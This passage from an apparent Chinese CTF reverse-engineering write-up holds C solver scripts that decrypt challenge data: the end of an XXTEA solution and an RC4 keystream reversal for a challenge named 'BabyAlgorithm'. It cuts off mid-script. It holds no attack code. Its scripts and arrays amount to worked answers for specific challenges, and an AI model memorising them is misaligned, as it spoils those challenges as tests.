class="number">0x9d</span>, <span class="number">0x96</span>,</span><br><span class="line">            <span class="number">0x40</span>, <span class="number">0xe</span>, <span class="number">0x20</span>, <span class="number">0x91</span>, <span class="number">0x16</span>,</span><br><span class="line">            <span class="number">0x4e</span>, <span class="number">0xab</span>, <span class="number">0x29</span>, <span class="number">0x3a</span>, <span class="number">0x71</span>,</span><br><span class="line">            <span class="number">0x3d</span>, <span class="number">0x39</span>, <span class="number">0xe5</span>, <span class="number">0x6c</span>, <span class="number">0x2e</span>,</span><br><span class="line">            <span class="number">0x75</span>, <span class="number">0x9d</span>, <span class="number">0xb6</span>, <span class="number">0xe6</span>, <span class="number">0x88</span>,</span><br><span class="line">            <span class="number">0x1a</span>, <span class="number">0x84</span>, <span class="number">0x59</span>, <span class="number">0xb4</span>, <span class="number">0x31</span>, <span class="number">0x6f</span></span><br><span class="line">    &#125;;</span><br><span class="line">    btea((<span class="type">uint32_t</span> *) data, <span class="number">-9</span>, k);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">36</span>; i += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, data[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果:</p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230807114835421.png" alt="image-20230807114835421" style="zoom:33%;" /><p>结束…</p><h2 id="BabyAlgorithm"><a href="#BabyAlgorithm" class="headerlink" title="BabyAlgorithm"></a>BabyAlgorithm</h2><p>这个题没啥好说的,就是RC4,然后我非要自己写脚本…费老半天</p><p>按照顺序把S-box(key)之类的求出来就行</p><p>我的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> key2[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">179</span>, <span class="number">98</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">170</span>, <span class="number">109</span>, <span class="number">41</span>, <span class="number">217</span>, <span class="number">180</span>, <span class="number">246</span>, <span class="number">227</span>, <span class="number">208</span>, <span class="number">96</span>, <span class="number">11</span>, <span class="number">160</span>, <span class="number">81</span>, <span class="number">205</span>, <span class="number">134</span>, <span class="number">234</span>, <span class="number">212</span>, <span class="number">155</span>, <span class="number">141</span>, <span class="number">20</span>,</span><br><span class="line">        <span class="number">250</span>, <span class="number">79</span>, <span class="number">127</span>, <span class="number">177</span>, <span class="number">105</span>, <span class="number">82</span>, <span class="number">63</span>, <span class="number">22</span>, <span class="number">130</span>, <span class="number">144</span>, <span class="number">253</span>, <span class="number">47</span>, <span class="number">125</span>, <span class="number">6</span>, <span class="number">18</span>, <span class="number">60</span>, <span class="number">117</span>, <span class="number">107</span>, <span class="number">44</span>, <span class="number">162</span>, <span class="number">83</span>, <span class="number">112</span>, <span class="number">56</span>, <span class="number">27</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">93</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>, <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">100</span>, <span class="number">74</span>, <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">140</span>, <span class="number">39</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>, <span class="number">64</span>, <span class="number">38</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">104</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>, <span class="number">91</span>,</span><br><span class="line">        <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">142</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>, <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>, <span class="number">215</span>,</span><br><span class="line">        <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>, <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>, <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>, <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">128</span>, <span class="number">25</span>, <span class="number">86</span>, <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">126</span>, <span class="number">53</span>, <span class="number">90</span>, <span class="number">24</span>, <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">164</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>, <span class="number">122</span>, <span class="number">166</span>, <span class="number">247</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">156</span>,</span><br><span class="line">        <span class="number">158</span>, <span class="number">154</span>, <span class="number">118</span>, <span class="number">31</span>, <span class="number">196</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">230</span>, <span class="number">28</span>, <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">137</span>, <span class="number">33</span>, <span class="number">199</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">206</span>, <span class="number">67</span>, <span class="number">228</span>, <span class="number">26</span>, <span class="number">237</span>, <span class="number">9</span>, <span class="number">51</span>, <span class="number">29</span>, <span class="number">181</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>, <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">136</span>, <span class="number">17</span>, <span class="number">176</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">85</span>, <span class="number">45</span>, <span class="number">2</span>, <span class="number">34</span>, <span class="number">59</span>, <span class="number">52</span>, <span class="number">254</span>, <span class="number">146</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">uint8_t</span> s3[] = &#123;</span><br><span class="line">        <span class="number">198</span>, <span class="number">33</span>, <span class="number">202</span>, <span class="number">191</span>, <span class="number">81</span>, <span class="number">67</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">117</span>, <span class="number">228</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">192</span>, <span class="number">84</span>, <span class="number">111</span>, <span class="number">143</span>, <span class="number">238</span>, <span class="number">248</span>, <span class="number">90</span>, <span class="number">162</span>, <span class="number">193</span>,</span><br><span class="line">        <span class="number">235</span>, <span class="number">165</span>, <span class="number">52</span>, <span class="number">109</span>, <span class="number">113</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">178</span>, <span class="number">168</span>,</span><br><span class="line">        <span class="number">47</span>, <span class="number">244</span>, <span class="number">81</span>, <span class="number">142</span>, <span class="number">12</span>, <span class="number">204</span>, <span class="number">51</span>, <span class="number">83</span>, <span class="number">49</span>, <span class="number">0</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">214</span>, <span class="number">202</span>, <span class="number">236</span>, <span class="number">212</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> len = <span class="number">45</span>;</span><br><span class="line">    <span class="type">uint8_t</span> s[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//v5,v6和key都需要提前跑一遍获取最后的状态,所以这个代码非常麻烦</span></span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">45</span>;</span><br><span class="line">    <span class="type">int</span> v6 = <span class="number">238</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">45</span>; i &gt;= <span class="number">0</span>;) &#123;</span><br><span class="line">        --i;</span><br><span class="line">        s[i] = s3[i] ^ (key2[((<span class="type">int</span>)key2[v5] + key2[v6])%<span class="number">256</span>]);</span><br><span class="line">        swap(key2 + v5, key2 + v6);</span><br><span class="line">        v6 = (v6 - (<span class="type">int</span>) key2[v5] + <span class="number">256</span>) % <span class="number">256</span>;</span><br><span class="line">        v5 = (v5 - <span class="number">1</span>) &lt; <span class="number">0</span> ? <span class="number">255</span> : v5 - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    这里用来求循环的最终状态以反向执行</span></span><br><span class="line"><span class="comment">    int v5 = 0;</span></span><br><span class="line"><span class="comment">    int v6 = 0;</span></span><br><span class="line"><span class="comment">    int i = 0;</span></span><br><span class="line"><span class="comment">    while (i &lt; len) &#123;</span></span><br><span class="line"><span class="comment">        v5 = (v5 + 1) % 256;</span></span><br><span class="line"><span class="comment">        v6 = (v6 + key2_origin[v5]) % 256;</span></span><br><span class="line"><span class="comment">        swap(key2_origin + v5, key2_origin + v6);</span></span><br><span class="line"><span class="comment">        ++i;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    printf(&quot;v5=%d,v6=%d\n&quot;, v5, v6);</span></span><br><span class="line"><span class="comment">    for (int i = 0; i &lt; 256; ++i) &#123;</span></span><br><span class="line"><span class="comment">        printf(&quot;%d,&quot;, key2_origin[i]);</span></span><br><span class="line"><span class="comment">    &#125;*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">45</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是我们实际上知道RC4的加解密的过程是相同的…</p><p>所以代码实际上基本不用改…</p><p>正解代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">swap</span><span class="params">(<span class="type">uint8_t</span> *a, <span class="type">uint8_t</span> *b)</span> &#123;</span><br><span class="line">    <span class="type">uint8_t</span> temp = *a;</span><br><span class="line">    *a = *b;</span><br><span class="line">    *b = temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> key2_origin[] = &#123;</span><br><span class="line">        <span class="number">78</span>, <span class="number">196</span>, <span class="number">247</span>, <span class="number">104</span>, <span class="number">9</span>, <span class="number">38</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">146</span>,</span><br><span class="line">        <span class="number">45</span>, <span class="number">154</span>, <span class="number">26</span>, <span class="number">100</span>, <span class="number">176</span>, <span class="number">33</span>, <span class="number">164</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">93</span>, <span class="number">162</span>, <span class="number">34</span>, <span class="number">74</span>, <span class="number">212</span>, <span class="number">27</span>, <span class="number">126</span>, <span class="number">251</span>,</span><br><span class="line">        <span class="number">118</span>, <span class="number">128</span>, <span class="number">85</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">79</span>, <span class="number">29</span>, <span class="number">248</span>,</span><br><span class="line">        <span class="number">142</span>, <span class="number">136</span>, <span class="number">15</span>, <span class="number">90</span>, <span class="number">105</span>, <span class="number">230</span>, <span class="number">180</span>, <span class="number">47</span>,</span><br><span class="line">        <span class="number">156</span>, <span class="number">140</span>, <span class="number">137</span>, <span class="number">54</span>, <span class="number">17</span>, <span class="number">56</span>, <span class="number">141</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">231</span>, <span class="number">205</span>, <span class="number">66</span>, <span class="number">135</span>, <span class="number">223</span>, <span class="number">120</span>, <span class="number">76</span>, <span class="number">95</span>,</span><br><span class="line">        <span class="number">159</span>, <span class="number">153</span>, <span class="number">163</span>, <span class="number">207</span>, <span class="number">161</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">155</span>,</span><br><span class="line">        <span class="number">71</span>, <span class="number">106</span>, <span class="number">209</span>, <span class="number">188</span>, <span class="number">94</span>, <span class="number">133</span>, <span class="number">19</span>, <span class="number">89</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">198</span>, <span class="number">44</span>, <span class="number">82</span>, <span class="number">182</span>, <span class="number">75</span>, <span class="number">101</span>, <span class="number">43</span>,</span><br><span class="line">        <span class="number">64</span>, <span class="number">170</span>, <span class="number">235</span>, <span class="number">150</span>, <span class="number">117</span>, <span class="number">65</span>, <span class="number">73</span>, <span class="number">240</span>,</span><br><span class="line">        <span class="number">16</span>, <span class="number">109</span>, <span class="number">244</span>, <span class="number">129</span>, <span class="number">222</span>, <span class="number">12</span>, <span class="number">171</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="number">91</span>, <span class="number">195</span>, <span class="number">210</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">192</span>, <span class="number">102</span>, <span class="number">41</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">148</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">32</span>, <span class="number">87</span>, <span class="number">152</span>, <span class="number">97</span>,</span><br><span class="line">        <span class="number">131</span>, <span class="number">143</span>, <span class="number">21</span>, <span class="number">174</span>, <span class="number">40</span>, <span class="number">239</span>, <span class="number">168</span>, <span class="number">57</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">197</span>, <span class="number">42</span>, <span class="number">186</span>, <span class="number">236</span>, <span class="number">77</span>, <span class="number">147</span>, <span class="number">121</span>,</span><br><span class="line">        <span class="number">169</span>, <span class="number">252</span>, <span class="number">233</span>, <span class="number">187</span>, <span class="number">189</span>, <span class="number">175</span>, <span class="number">69</span>, <span class="number">232</span>,</span><br><span class="line">        <span class="number">221</span>, <span class="number">10</span>, <span class="number">220</span>, <span class="number">4</span>, <span class="number">200</span>, <span class="number">202</span>, <span class="number">226</span>, <span class="number">213</span>,</span><br><span class="line">        <span class="number">185</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">173</span>, <span class="number">167</span>, <span class="number">138</span>, <span class="number">108</span>, <span class="number">88</span>,</span><br><span class="line">        <span class="number">245</span>, <span class="number">238</span>, <span class="number">48</span>, <span class="number">255</span>, <span class="number">190</span>, <span class="number">127</span>, <span class="number">25</span>, <span class="number">86</span>,</span><br><span class="line">        <span class="number">84</span>, <span class="number">194</span>, <span class="number">243</span>, <span class="number">114</span>, <span class="number">191</span>, <span class="number">99</span>, <span class="number">23</span>, <span class="number">250</span>,</span><br><span class="line">        <span class="number">157</span>, <span class="number">119</span>, <span class="number">211</span>, <span class="number">145</span>, <span class="number">20</span>, <span class="number">53</span>, <span class="number">125</span>, <span class="number">24</span>,</span><br><span class="line">        <span class="number">183</span>, <span class="number">35</span>, <span class="number">139</span>, <span class="number">160</span>, <span class="number">218</span>, <span class="number">5</span>, <span class="number">123</span>, <span class="number">225</span>,</span><br><span class="line">        <span class="number">122</span>, <span class="number">166</span>, <span class="number">98</span>, <span class="number">113</span>, <span class="number">204</span>, <span class="number">216</span>, <span class="number">107</span>, <span class="number">158</span>,</span><br><span class="line">        <span class="number">246</span>, <span class="number">63</span>, <span class="number">31</span>, <span class="number">179</span>, <span class="number">46</span>, <span class="number">92</span>, <span class="number">18</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">241</span>, <span class="number">103</span>, <span class="number">203</span>, <span class="number">172</span>, <span class="number">62</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">116</span>, <span class="number">193</span>, <span class="number">134</span>, <span class="number">81</span>, <span class="number">199</span>, <span class="number">130</span>, <span class="number">206</span>,</span><br><span class="line">        <span class="number">67</span>, <span class="number">228</span>, <span class="number">227</span>, <span class="number">237</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">22</span>, <span class="number">181</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">55</span>, <span class="number">219</span>, <span class="number">201</span>, <span class="number">242</span>, <span class="number">132</span>, <span class="number">80</span>, <span class="number">149</span>,</span><br><span class="line">        <span class="number">165</span>, <span class="number">214</span>, <span class="number">70</span>, <span class="number">184</span>, <span class="number">253</span>, <span class="number">112</span>, <span class="number">96</span>, <span class="number">36</span>,</span><br><span class="line">        <span class="number">151</span>, <span class="number">110</span>, <span class="number">177</span>, <span class="number">60</span>, <span class="number">2</span>, <span class="number">234</span>, <span class="number">59</span>, <span class="number">52</span>,</span><br><span class="line">        <span class="number">254</span>, <span class="number">217</span>, <span class="number">249</span>, <span class="number">124</span>, <span class="number">224</span>, <span class="number">61</span>, <span class="number">49</span></span><br><span 